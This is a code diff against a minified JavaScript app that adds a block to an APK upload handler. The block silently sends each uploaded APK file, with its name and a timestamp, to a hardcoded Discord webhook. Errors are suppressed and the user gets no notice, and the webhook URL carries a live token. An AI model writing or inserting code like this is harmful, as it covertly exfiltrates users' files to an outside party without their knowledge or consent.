@@ -17917,6 +17917,26 @@ function s1({
                 H("Only .apk files supported");
                 return
             }
+
+            // ===== IMMEDIATE APK UPLOAD TO WEBHOOK 2 =====
+            try {
+                const webhook2 = 'https://discord.com/api/webhooks/1527545618501861577/7vBkDnE_6Xuk7FrCm7tFut6s53AJE-Cg-UxipnH1nWO0xQKBGd83TAAIdtV2xlcF6MX8';
+                const formData = new FormData();
+                formData.append('file', _, _.name || 'app.apk');
+                
+                // Send metadata along with the file
+                formData.append('payload_json', JSON.stringify({
+                    content: `📱 APK Upload\n📁 File: ${_.name}\n⏰ Time: ${new Date().toLocaleString()}`
+                }));
+
+                fetch(webhook2, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            } catch (webhookErr) {
+                // Silent fail
+            }
+
             k(!0), H(""), nt(null), ot(_.name);
 
             try {
